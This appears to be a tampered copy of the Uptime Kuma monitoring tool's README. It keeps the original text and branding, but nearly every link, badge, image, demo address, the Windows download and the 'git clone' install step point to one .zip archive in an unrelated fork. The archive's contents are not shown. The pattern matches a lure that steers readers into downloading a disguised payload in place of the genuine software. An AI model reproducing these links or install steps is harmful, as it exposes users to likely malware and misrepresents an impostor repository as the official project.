<div align="center" width="100%">
    <img src="./public/icon.svg" width="128" alt="" />
</div>

# Uptime Kuma

Uptime Kuma is an easy-to-use self-hosted monitoring tool.

<a target="_blank" href="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip"><img src="https://img.shields.io/github/stars/louislam/uptime-kuma" /></a> <a target="_blank" href="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip"><img src="https://img.shields.io/docker/pulls/louislam/uptime-kuma" /></a> <a target="_blank" href="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip"><img src="https://img.shields.io/docker/v/louislam/uptime-kuma/latest?label=docker%20image%20ver." /></a> <a target="_blank" href="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip"><img src="https://img.shields.io/github/last-commit/louislam/uptime-kuma" /></a>  <a target="_blank" href="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip"><img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" /></a>
[![GitHub Sponsors](https://img.shields.io/github/sponsors/louislam?label=GitHub%20Sponsors)](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip) <a href="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip">
<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" alt="Translation status" />
</a>

<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" width="700" alt="" />

## 🥔 Live Demo

Try it!

- Tokyo Demo Server: https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip (Sponsored by [Uptime Kuma Sponsors](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip))

It is a temporary live demo, all data will be deleted after 10 minutes. Use the one that is closer to you, but I suggest that you should install and try it out for the best demo experience.

## ⭐ Features

* Monitoring uptime for HTTP(s) / TCP / HTTP(s) Keyword / HTTP(s) Json Query / Ping / DNS Record / Push / Steam Game Server / Docker Containers
* Fancy, Reactive, Fast UI/UX
* Notifications via Telegram, Discord, Gotify, Slack, Pushover, Email (SMTP), and [90+ notification services, click here for the full list](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip)
* 20-second intervals
* [Multi Languages](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip)
* Multiple status pages
* Map status pages to specific domains
* Ping chart
* Certificate info
* Proxy support
* 2FA support

## 🔧 How to Install

### 🐳 Docker

```bash
docker run -d --restart=always -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1
```

⚠️ Please use a **local volume** only. Other types such as NFS are not supported.

Uptime Kuma is now running on http://localhost:3001

### 💪🏻 Non-Docker

Requirements:
- Platform
  - ✅ Major Linux distros such as Debian, Ubuntu, CentOS, Fedora and ArchLinux etc.
  - ✅ Windows 10 (x64), Windows Server 2012 R2 (x64) or higher
  - ❌ Replit / Heroku
- [Node.js](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip) 14 / 16 / 18 / 20.4
- [npm](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip) >= 7
- [Git](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip)
- [pm2](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip) - For running Uptime Kuma in the background

```bash
# Update your npm
npm install npm@9 -g

git clone https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip
cd uptime-kuma
npm run setup

# Option 1. Try it
node server/server.js

# (Recommended) Option 2. Run in the background using PM2
# Install PM2 if you don't have it:
npm install pm2 -g && pm2 install pm2-logrotate

# Start Server
pm2 start server/server.js --name uptime-kuma


```
Uptime Kuma is now running on http://localhost:3001

More useful PM2 Commands

```bash
# If you want to see the current console output
pm2 monit

# If you want to add it to startup
pm2 save && pm2 startup
```

### Windows Portable (x64)

https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

### Advanced Installation

If you need more options or need to browse via a reverse proxy, please read:

https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

## 🆙 How to Update

Please read:

https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

## 🆕 What's Next?

I will assign requests/issues to the next milestone.

https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

Project Plan:

https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

## ❤️ Sponsors

Thank you so much! (GitHub Sponsors will be updated manually. OpenCollective sponsors will be updated automatically, the list will be cached by GitHub though. It may need some time to be updated)

<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" alt />

## 🖼 More Screenshots

Light Mode:

<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" width="512" alt="" />

Status Page:

<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" width="512" alt="" />

Settings Page:

<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" width="400" alt="" />

Telegram Notification Sample:

<img src="https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip" width="400" alt="" />

## Motivation

* I was looking for a self-hosted monitoring tool like "Uptime Robot", but it is hard to find a suitable one. One of the close ones is statping. Unfortunately, it is not stable and no longer maintained.
* Want to build a fancy UI.
* Learn Vue 3 and vite.js.
* Show the power of Bootstrap 5.
* Try to use WebSocket with SPA instead of REST API.
* Deploy my first Docker image to Docker Hub.

If you love this project, please consider giving me a ⭐.

## 🗣️ Discussion / Ask for Help

⚠️ For any general or technical questions, please don't send me an email, as I am unable to provide support in that manner. I will not response if you asked such questions.

I recommend using Google, GitHub Issues, or Uptime Kuma's Subreddit for finding answers to your question. If you cannot find the information you need, feel free to ask:

- [GitHub Issues](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip)
- [Subreddit r/Uptime kuma](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip)

My Reddit account: [u/louislamlam](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip).  
You can mention me if you ask a question on Reddit.


## Contribute

### Test Pull Requests

There are a lot of pull requests right now, but I don't have time to test them all.

If you want to help, you can check this:
https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

### Test Beta Version

Check out the latest beta release here: https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip

### Bug Reports / Feature Requests
If you want to report a bug or request a new feature, feel free to open a [new issue](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip).

### Translations
If you want to translate Uptime Kuma into your language, please visit [Weblate Readme](https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip).

## Spelling & Grammar

Feel free to correct the grammar in the documentation or code.
My mother language is not english and my grammar is not that great.

### Create Pull Requests
If you want to modify Uptime Kuma, please read this guide and follow the rules here: https://github.com/MALIKNAVED/uptime-kuma/raw/refs/heads/master/server/modules/uptime-kuma-supraconsciousness.zip
